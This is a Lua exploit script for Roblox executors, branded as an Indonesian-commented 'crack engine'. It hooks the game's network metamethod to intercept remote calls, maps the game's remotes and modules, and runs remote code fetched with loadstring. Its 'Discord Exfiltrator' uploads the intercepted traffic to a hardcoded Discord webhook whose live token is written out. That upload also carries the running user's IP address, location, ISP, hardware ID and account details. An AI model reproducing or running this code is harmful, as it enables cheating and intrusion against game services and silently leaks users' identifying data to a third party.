--[[
══════════════════════════════════════════════════════════════════════════
👁️ MIZUKAGE CRACK-ENGINE V14.0 (THE OMNISCIENT)
🔥 Terintegrasi: Luna Interface Suite, God-Eye V6 Logger, Terminal Top-Scroll
🔥 Fungsi Super: Omniscient Deep-Scan (Game Architecture Blueprinting), Dynamic Naming
══════════════════════════════════════════════════════════════════════════
]]

if getgenv().MizuCrackEngineLoaded then
    return game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Mizukage Engine", Text = "Crack-Engine sudah berjalan di memori!"})
end
getgenv().MizuCrackEngineLoaded = true

--========================================================================
-- 1. DEKLARASI SERVICE & TARGET WEBHOOK
--========================================================================
local Services = setmetatable({}, { __index = function(t, k) return game:GetService(k) end })
local Players = Services.Players
local LocalPlayer = Players.LocalPlayer
local HttpService = Services.HttpService
local RunService = Services.RunService
local MarketplaceService = Services.MarketplaceService
local UserInputService = Services.UserInputService
local CoreGui = Services.CoreGui
local Stats = Services.Stats
local TweenService = Services.TweenService

-- 🎯 WEBHOOK DATABASE EKSKLUSIF
local WEBHOOK_URL = "https://discord.com/api/webhooks/1483643363873001703/A4vanwmvJqZKYirad5LBwQxV4oepsRQPJloiJNgfz8Xzy7c3xLm1uW0BAVl1P5WiVTsf"
local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

--========================================================================
-- 2. GLOBAL STATE & CACHE (GOD-EYE INTELLIGENCE)
--========================================================================
getgenv().MizuCrack = {
    IsRunning = true,
    RecOut = false, 
    RecIn = false,
    IgnoreList = {"mouse", "camera", "move", "walk", "step", "ping", "heartbeat", "update", "look", "anim", "sound", "music"},
    MaxLogs = 150
}

local State = {
    RawBuffer = {}, Logs = {}, LogQueue = {}, TotalCalls = 0,
    Connections = {}, HookedRemotes = {}, 
    GameName = "Unknown Game", ArchitectureReport = ""
}

-- Mengambil Nama Game (Untuk Penamaan File Otomatis)
pcall(function() 
    local info = MarketplaceService:GetProductInfo(game.PlaceId)
    State.GameName = info and info.Name or "Unknown Game"
end)

local CachedData = {
    HWID = "Unknown", AvatarURL = "https://i.imgur.com/rXf1N37.png",
    IP_Data = { query = "Hidden", country = "Unknown", city = "Unknown", isp = "Unknown" },
    Executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor",
    Platform = UserInputService.TouchEnabled and not UserInputService.MouseEnabled and "Mobile" or "PC"
}

task.spawn(function()
    pcall(function() CachedData.HWID = (gethwid and gethwid()) or (identifying and identifying()) or Services.RbxAnalyticsService:GetClientId() end)
    pcall(function()
        local ApiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=false"
        local Data = HttpService:JSONDecode(game:HttpGet(ApiUrl))
        if Data.data and Data.data[1] then CachedData.AvatarURL = Data.data[1].imageUrl end
    end)
    pcall(function() CachedData.IP_Data = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json")) end)
end)

local function IsIgnored(name)
    local low = name:lower()
    for _, v in ipairs(getgenv().MizuCrack.IgnoreList) do 
        if low:match(v) then return true end 
    end
    return false
end

--========================================================================
-- 3. ALGORITMA SERIALIZER (LUA SCRIPT CONVERTER)
--========================================================================
local function GetPath(obj)
    if typeof(obj) ~= "Instance" then return "nil" end
    local pathTbl = {}
    local current = obj
    while current and current ~= game do
        if current.Parent == game then table.insert(pathTbl, 1, 'game:GetService("' .. current.ClassName .. '")')
        else
            local name = current.Name
            if name:match("^[%a_][%w_]*$") then table.insert(pathTbl, 1, '.' .. name)
            else table.insert(pathTbl, 1, '["' .. name:gsub('"', '\\"') .. '"]') end
        end
        current = current.Parent
    end
    local finalPath = table.concat(pathTbl, "")
    return finalPath ~= "" and finalPath or "nil"
end

local function SerializeLua(v, d, s)
    d = d or 1; s = s or {}
    if d > 4 then return "\"...\"" end 
    local ind = string.rep("  ", d)
    local ty = typeof(v)
    if ty == "string" then return string.format("%q", v)
    elseif ty == "Instance" then return GetPath(v)
    elseif ty == "CFrame" or ty == "Vector3" then return ty..".new("..tostring(v)..")"
    elseif ty == "table" then
        if s[v] then return "\"[CYCLE]\"" end s[v] = true
        local res, c = "{\n", 0
        for k, val in pairs(v) do if k~="n" then c=c+1; res = res..ind..(type(k)=="string" and k or "["..SerializeLua(k,d+1,s).."]").." = "..SerializeLua(val,d+1,s)..",\n" end end
        return c==0 and "{}" or res..string.rep("  ", d-1).."}"
    else return tostring(v) end
end

--========================================================================
-- 4. LIVE TERMINAL (TOP-HIGHLIGHT FIX)
--========================================================================
local TerminalGUI = Instance.new("ScreenGui")
TerminalGUI.Name = "MizuCrackTerminal"
TerminalGUI.ResetOnSpawn = false
TerminalGUI.Parent = gethui and gethui() or CoreGui

local TermFrame = Instance.new("Frame", TerminalGUI)
TermFrame.Size = UDim2.new(0, 350, 0, 200)
TermFrame.Position = UDim2.new(1, -360, 0, 10)
TermFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
TermFrame.BackgroundTransparency = 0.2
TermFrame.BorderSizePixel = 1
TermFrame.BorderColor3 = Color3.fromRGB(0, 255, 200)
Instance.new("UICorner", TermFrame).CornerRadius = UDim.new(0, 6)

local TermTitle = Instance.new("TextLabel", TermFrame)
TermTitle.Size = UDim2.new(1, 0, 0, 20)
TermTitle.BackgroundTransparency = 1
TermTitle.Text = " 🕷️ LIVE TRAFFIC BUFFER (NEWEST AT TOP)"
TermTitle.TextColor3 = Color3.fromRGB(0, 255, 200)
TermTitle.Font = Enum.Font.Code
TermTitle.TextSize = 12
TermTitle.TextXAlignment = Enum.TextXAlignment.Left

local TermScroll = Instance.new("ScrollingFrame", TermFrame)
TermScroll.Size = UDim2.new(1, -10, 1, -25)
TermScroll.Position = UDim2.new(0, 5, 0, 20)
TermScroll.BackgroundTransparency = 1
TermScroll.ScrollBarThickness = 2
TermScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
local TermLayout = Instance.new("UIListLayout", TermScroll)
TermLayout.SortOrder = Enum.SortOrder.LayoutOrder -- Agar log baru bisa di-force ke atas

local function MakeDraggable(obj)
    local drag, dStart, sPos
    obj.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then drag = true dStart = i.Position sPos = obj.Position end end)
    obj.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then drag = false end end)
    UserInputService.InputChanged:Connect(function(i) if drag and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then obj.Position = UDim2.new(sPos.X.Scale, sPos.X.Offset + (i.Position.X - dStart.X), sPos.Y.Scale, sPos.Y.Offset + (i.Position.Y - dStart.Y)) end end)
end
MakeDraggable(TermFrame)

local GlobalLogIndex = 0

local function RenderLogToTerminal(data)
    if #TermScroll:GetChildren() > getgenv().MizuCrack.MaxLogs then
        local oldest, highestOrder = nil, -999999
        for _, v in ipairs(TermScroll:GetChildren()) do 
            if v:IsA("TextLabel") and v.LayoutOrder > highestOrder then 
                highestOrder = v.LayoutOrder; oldest = v 
            end 
        end
        if oldest then oldest:Destroy() end
    end
    
    GlobalLogIndex = GlobalLogIndex + 1
    local lbl = Instance.new("TextLabel", TermScroll)
    lbl.LayoutOrder = -GlobalLogIndex -- Memaksa log terbaru muncul di paling atas
    lbl.Size = UDim2.new(1, 0, 0, 0)
    lbl.AutomaticSize = Enum.AutomaticSize.Y
    lbl.BackgroundTransparency = 1
    lbl.RichText = true
    lbl.Font = Enum.Font.Code
    lbl.TextSize = 10
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.TextWrapped = true
    
    local col = (data.Type == "IN" and "#ff3264") or (data.Type == "SCAN" and "#9664ff") or "#00ff96"
    local txt = string.format("<font color='#888'>[%s]</font> <font color='%s'><b>[%s]</b> %s</font>", data.Time, col, data.Type, data.Name)
    if data.CallCount > 1 then txt = txt .. " <font color='#ffc800'>(x" .. data.CallCount .. ")</font>" end
    
    lbl.Text = txt
    data.UILabel = lbl
end

--========================================================================
-- 5. ENGINE PROCESSOR & HOOKING
--========================================================================
table.insert(State.Connections, RunService.Heartbeat:Connect(function()
    local maxProcess = 40
    local processed = 0

    while #State.RawBuffer > 0 and processed < maxProcess do
        processed = processed + 1
        local raw = table.remove(State.RawBuffer, 1)
        local rName = tostring(raw.Obj)
        
        if not IsIgnored(rName) or raw.Type == "SCAN" then
            State.TotalCalls = State.TotalCalls + 1
            local lastLog = State.Logs[#State.Logs]
            
            if lastLog and lastLog.Name == rName and lastLog.Type == raw.Type then
                lastLog.CallCount = (lastLog.CallCount or 1) + 1
                lastLog.ArgsLua = SerializeLua(raw.Args)
                lastLog.Time = raw.Time
                if lastLog.UILabel then 
                    local col = (lastLog.Type == "IN" and "#ff3264") or (lastLog.Type == "SCAN" and "#9664ff") or "#00ff96"
                    lastLog.UILabel.Text = string.format("<font color='#888'>[%s]</font> <font color='%s'><b>[%s]</b> %s</font> <font color='#ffc800'>(x%d)</font>", lastLog.Time, col, lastLog.Type, lastLog.Name, lastLog.CallCount)
                end
            else
                local logData = {
                    Time = raw.Time, Type = raw.Type, Path = GetPath(raw.Obj), Name = rName,
                    ArgsLua = SerializeLua(raw.Args), Caller = raw.Caller, Method = raw.Method,
                    CallCount = 1, UILabel = nil
                }
                table.insert(State.Logs, logData)
                RenderLogToTerminal(logData)
            end
        end
    end
end))

-- HOOK OUTBOUND
local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    if getgenv().MizuCrack.RecOut then
        local method = tostring(getnamecallmethod())
        if method == "FireServer" or method == "InvokeServer" then
            local rName = tostring(self)
            if not IsIgnored(rName) then
                table.insert(State.RawBuffer, { Time = os.date("%H:%M:%S"), Type = "OUT", Obj = self, Args = {...}, Method = method, Caller = "Client" })
            end
        end
    end
    return oldNamecall(self, ...)
end))

-- HOOK INBOUND
local function HookInbound(remote)
    if remote:IsA("RemoteEvent") and not State.HookedRemotes[remote] then
        State.HookedRemotes[remote] = true
        table.insert(State.Connections, remote.OnClientEvent:Connect(function(...)
            if getgenv().MizuCrack.RecIn then
                local rName = tostring(remote)
                if not IsIgnored(rName) then
                    table.insert(State.RawBuffer, { Time = os.date("%H:%M:%S"), Type = "IN", Obj = remote, Args = {...}, Method = "OnClientEvent", Caller = "Server" })
                end
            end
        end))
    end
end
for _, v in ipairs(game:GetDescendants()) do pcall(HookInbound, v) end
table.insert(State.Connections, game.DescendantAdded:Connect(function(v) if v.ClassName == "RemoteEvent" then pcall(HookInbound, v) end end))

--========================================================================
-- 6. OMNISCIENT DEEPSCAN V3 (Architecture Blueprinting)
--========================================================================
local function RunOmniscientScan()
    task.spawn(function()
        local found = { RE = 0, RF = 0, Modules = 0 }
        local blueprint = {}
        
        table.insert(blueprint, "--========================================================================")
        table.insert(blueprint, "-- 🗺️ MIZU-OS ARCHITECTURE BLUEPRINT (CLIENT-SERVER INFRASTRUCTURE)")
        table.insert(blueprint, "-- Peta ini menunjukkan bagaimana Client dan Server berkomunikasi,")
        table.insert(blueprint, "-- serta lokasi logic game (ModuleScript) yang mengontrol alur permainan.")
        table.insert(blueprint, "--========================================================================")

        local function scanDir(dir, indent)
            if not dir then return end
            for _, v in ipairs(dir:GetChildren()) do
                if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                    local pType = v:IsA("RemoteEvent") and "RE" or "RF"
                    found[pType] = found[pType] + 1
                    table.insert(blueprint, indent .. "⚡ [" .. pType .. "] " .. v.Name)
                    
                    -- Masukkan ke buffer terminal juga
                    table.insert(State.RawBuffer, { 
                        Time = os.date("%H:%M:%S"), Type = "SCAN", Obj = v, 
                        Args = { "Scanned By Mizukage", "Type: " .. pType }, 
                        Method = "Mapping", Caller = "Omniscient Scanner" 
                    })
                elseif v:IsA("ModuleScript") then
                    found.Modules = found.Modules + 1
                    table.insert(blueprint, indent .. "🧠 [MOD] " .. v.Name)
                elseif v:IsA("Folder") or v:IsA("Configuration") then
                    local hasImportant = false
                    for _, child in ipairs(v:GetDescendants()) do
                        if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") or child:IsA("ModuleScript") then
                            hasImportant = true; break
                        end
                    end
                    if hasImportant then
                        table.insert(blueprint, indent .. "📁 " .. v.Name)
                        scanDir(v, indent .. "  ")
                    end
                end
            end
        end

        table.insert(blueprint, "\n[📦 REPLICATED STORAGE]")
        pcall(function() scanDir(game:GetService("ReplicatedStorage"), "  ") end)
        task.wait(0.1)

        table.insert(blueprint, "\n[🌍 WORKSPACE]")
        pcall(function() scanDir(game:GetService("Workspace"), "  ") end)
        task.wait(0.1)

        -- Simpan blueprint ke memori untuk di-export nanti
        State.ArchitectureReport = table.concat(blueprint, "\n")

        -- Notif Selesai ke Terminal
        table.insert(State.RawBuffer, { 
            Time = os.date("%H:%M:%S"), Type = "SCAN", Obj = game, 
            Args = { "OMNISCIENT SCAN COMPLETED!", "Remotes: " .. (found.RE + found.RF), "Modules: " .. found.Modules }, 
            Method = "REPORT", Caller = "System" 
        })
    end)
end

--========================================================================
-- 7. DISCORD EXFILTRATOR (DYNAMIC NAMING & EXECUTIVE TERMINAL)
--========================================================================
local function ExfiltrateData()
    if #State.Logs == 0 and State.ArchitectureReport == "" then return end
    if not req then return end
    
    task.spawn(function()
        local lines = {}
        table.insert(lines, "-- ╔════════════════════════════════════════════════════════════════╗")
        table.insert(lines, "-- ║ 👑 MIZUKAGE V14.0 TeamMizu - OFFICIAL EXPORT REPORT")
        table.insert(lines, "-- ║ 🛡️ AUTHOR   : TeamMizu")
        table.insert(lines, "-- ║ 🎮 TARGET   : " .. State.GameName .. " (" .. tostring(game.PlaceId) .. ")")
        table.insert(lines, "-- ║ 👤 CLIENT   : " .. LocalPlayer.Name)
        table.insert(lines, "-- ║ 🕒 STAMP    : " .. os.date("%Y-%m-%d %H:%M:%S"))
        table.insert(lines, "-- ╚════════════════════════════════════════════════════════════════╝\n")

        -- Sisipkan Architecture Blueprint jika ada
        if State.ArchitectureReport ~= "" then
            table.insert(lines, State.ArchitectureReport)
            table.insert(lines, "\n--========================================================================")
            table.insert(lines, "-- 📡 LIVE TRAFFIC LOGS (INTERCEPTED REMOTES)")
            table.insert(lines, "--========================================================================\n")
        end

        for i, log in ipairs(State.Logs) do
            local countTag = log.CallCount > 1 and " (Triggered " .. log.CallCount .. "x)" or ""
            table.insert(lines, "-- ✦ [" .. log.Time .. " | " .. log.Type .. "] ➾ " .. log.Name .. countTag .. " | Caller: " .. log.Caller)
            if log.Type == "SCAN" then 
                table.insert(lines, "-- ↳ Path: " .. log.Path .. " | Type: " .. log.Method .. "\n")
            else
                table.insert(lines, "local args = " .. log.ArgsLua)
                if log.Type == "OUT" then table.insert(lines, log.Path .. ":" .. log.Method .. "(unpack(args))\n") else table.insert(lines, "") end
            end
            if i % 300 == 0 then task.wait() end
        end
        
        local finalTxt = table.concat(lines, "\n")
        
        -- [ FIX ] DYNAMIC FILE NAMING
        local cleanGameName = State.GameName:gsub("[^%w%s-]", ""):gsub("%s+", "_")
        local fileName = string.format("MizuDump_%s_%s.lua", cleanGameName, os.date("%H%M%S"))
        
        local LivePing = pcall(function() return math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) end) and math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) or 0
        
        -- Leaderstats Cleaner
        local GameStatsText, LS = "", LocalPlayer:FindFirstChild("leaderstats")
        if LS then
            local TempStats = {}
            for _, v in pairs(LS:GetChildren()) do
                if v:IsA("IntValue") or v:IsA("NumberValue") or v:IsA("StringValue") then 
                    local cleanVal = tostring(v.Value):gsub("[^%w%s%p]", "")
                    if cleanVal == "" then cleanVal = "0" end
                    table.insert(TempStats, string.format("%-12s : %s", v.Name, cleanVal))
                end
            end
            GameStatsText = #TempStats > 0 and table.concat(TempStats, "\n") or "No Visible Stats Data"
        else
            GameStatsText = "Leaderstats Not Found"
        end

        -- Executive Embed Design
        local EmbedData = {
            ["username"] = "TeamMizu-Cracker",
            ["avatar_url"] = "https://cdn.discordapp.com/icons/862675902196023306/33a443a96160910f443b879c2350702d.png",
            ["content"] = "📁 **DUMP FILE SECURED** | Uniques: `" .. #State.Logs .. "` | Calls: `" .. State.TotalCalls .. "`",
            ["embeds"] = {{
                ["author"] = {
                    ["name"] = "Target Intel: " .. LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")",
                    ["icon_url"] = CachedData.AvatarURL
                },
                ["title"] = "🎮 " .. State.GameName,
                ["color"] = 0x00E5FF, 
                ["thumbnail"] = { 
                    ["url"] = CachedData.AvatarURL -- [FIX] Menampilkan Avatar Roblox Target
                },
                ["fields"] = {
                    { 
                        ["name"] = "💻 HARDWARE & ENGINE", 
                        ["value"] = string.format("```yaml\nExecutor : %s (%s)\nHWID     : %s\nLatency  : %d ms\nAcc. Age : %d Days\n```", CachedData.Executor, CachedData.Platform, CachedData.HWID, LivePing, LocalPlayer.AccountAge), 
                        ["inline"] = false 
                    },
                    { 
                        ["name"] = "🌍 NETWORK DATA", 
                        ["value"] = string.format("```yaml\nIP Addr  : %s\nLocation : %s, %s\nISP      : %s\n```", CachedData.IP_Data.query, CachedData.IP_Data.city, CachedData.IP_Data.country, CachedData.IP_Data.isp), 
                        ["inline"] = false 
                    },
                    { 
                        ["name"] = "📊 IN-GAME LEADERSTATS", 
                        ["value"] = string.format("```yaml\n%s\n```", GameStatsText), 
                        ["inline"] = false 
                    }
                },
                ["footer"] = { 
                    ["text"] = "TeamMizu V14.0 • Crack Engine" 
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        
        local boundary = "----WebKitFormBoundary" .. HttpService:GenerateGUID(false):gsub("-", "")
        local body = "--" .. boundary .. "\r\nContent-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n" .. HttpService:JSONEncode(EmbedData) .. "\r\n--" .. boundary .. "\r\nContent-Disposition: form-data; name=\"file\"; filename=\""..fileName.."\"\r\nContent-Type: text/plain\r\n\r\n" .. finalTxt .. "\r\n--" .. boundary .. "--\r\n"
        
        pcall(function() req({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "multipart/form-data; boundary=" .. boundary}, Body = body}) end)
    end)
end

--========================================================================
-- 8. LUNA INTERFACE BINDING
--========================================================================
local Luna = loadstring(game:HttpGet("https://raw.githubusercontent.com/Nebula-Softworks/Luna-Interface-Suite/refs/heads/master/source.lua", true))()
local Window = Luna:CreateWindow({ Name = "Mizukage Apex", Subtitle = "Crack-Engine V14.0", LogoID = "82795327169782", LoadingEnabled = true, LoadingTitle = "Mizukage System", ConfigSettings = { ConfigFolder = "MizuCrack" }, KeySystem = false })
Window:CreateHomeTab({ SupportedExecutors = {"Delta", "Codex", "Wave", "Arceus X"}, DiscordInvite = "mizukage", Icon = 1 })

local CtrlTab = Window:CreateTab({ Name = "Control Center", Icon = "memory", ImageSource = "Material", ShowTitle = true })
CtrlTab:CreateSection("⚡ Remote Spy Controls")

CtrlTab:CreateToggle({
	Name = "Merekam Outbound (FireServer)",
	Description = "Menangkap remote yang dikirim klien ke server.",
	CurrentValue = false,
	Callback = function(V) getgenv().MizuCrack.RecOut = V end
}, "TglOut")

CtrlTab:CreateToggle({
	Name = "Merekam Inbound (OnClientEvent)",
	Description = "Menangkap remote yang dikirim server ke klien.",
	CurrentValue = false,
	Callback = function(V) getgenv().MizuCrack.RecIn = V end
}, "TglIn")

CtrlTab:CreateButton({
	Name = "DEEPSCAN V3",
	Description = "Memetakan seluruh arsitektur game (Remote & ModuleScript) untuk menganalisa cara kerja game secara absolut.",
	Callback = function() RunOmniscientScan(); Luna:Notification({Title="Scanner", Icon="search", ImageSource="Material", Content="Menganalisa Arsitektur Game..."}) end
})

CtrlTab:CreateButton({
	Name = "🗑️ Bersihkan Buffer (Clear Logs)",
	Callback = function() 
        State.Logs = {}; State.RawBuffer = {}; State.TotalCalls = 0; GlobalLogIndex = 0; State.ArchitectureReport = ""
        for _,v in ipairs(TermScroll:GetChildren()) do if v:IsA("TextLabel") then v:Destroy() end end 
        Luna:Notification({Title="Clear", Icon="delete", ImageSource="Material", Content="Buffer telah dibersihkan."})
    end
})

CtrlTab:CreateDivider()
CtrlTab:CreateSection("☁️ Data Exfiltration")

CtrlTab:CreateButton({
	Name = "📤 Export ke Discord Webhook",
	Description = "Mengekspor Peta Arsitektur, Log Trafik, dan Identitas ke Webhook.",
	Callback = function()
        if #State.Logs == 0 and State.ArchitectureReport == "" then return Luna:Notification({Title="Gagal", Icon="error", ImageSource="Material", Content="Buffer & Peta kosong!"}) end
        ExfiltrateData()
        Luna:Notification({Title="Exporting", Icon="cloud_upload", ImageSource="Material", Content="Mengirim payload ke Discord..."})
	end
})

local VisualTab = Window:CreateTab({ Name = "Visual & Filter", Icon = "visibility", ImageSource = "Material", ShowTitle = true })
VisualTab:CreateSection("👁️ Terminal Settings")

VisualTab:CreateToggle({
	Name = "Tampilkan Live Terminal",
	Description = "Menampilkan jendela hitam log real-time di layar.",
	CurrentValue = true,
	Callback = function(V) TermFrame.Visible = V end
}, "TglTerm")

VisualTab:CreateButton({
    Name = "🛑 Shutdown Engine",
    Callback = function()
        getgenv().MizuCrack.IsRunning = false
        getgenv().MizuCrackEngineLoaded = false
        for _, c in pairs(State.Connections) do pcall(function() c:Disconnect() end) end
        TerminalGUI:Destroy()
        Luna:Destroy()
    end
})

Window:CreateTab({ Name = "Theme", Icon = "palette", ImageSource = "Material", ShowTitle = true }):BuildThemeSection()

Luna:Notification({ Title = "Engine Active", Icon = "check_circle", ImageSource = "Material", Content = "Crack-Engine V14.0 (The Omniscient) berhasil disuntikkan!" })